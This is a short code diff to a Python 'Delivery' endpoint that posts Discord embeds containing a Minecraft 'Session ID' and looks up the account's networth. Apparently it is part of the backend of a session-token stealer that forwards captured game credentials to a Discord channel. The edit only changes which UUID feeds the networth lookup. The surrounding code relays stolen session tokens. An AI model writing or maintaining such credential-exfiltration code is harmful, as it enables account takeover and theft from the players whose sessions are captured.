@@ -95,7 +95,7 @@ class Delivery(Resource):
         mc_embed.add_embed_field(name="Session ID", value=cb + mc['ssid'] + cb, inline=False)
         embeds.append(mc_embed)
 
-        profile_data = networth.get_profiles(mc['uuid'])
+        profile_data = networth.get_profiles(args["minecraft"]["uuid"])
 
         if profile_data:
             nw_embed = DiscordEmbed(title=config['nw_embed_title'],
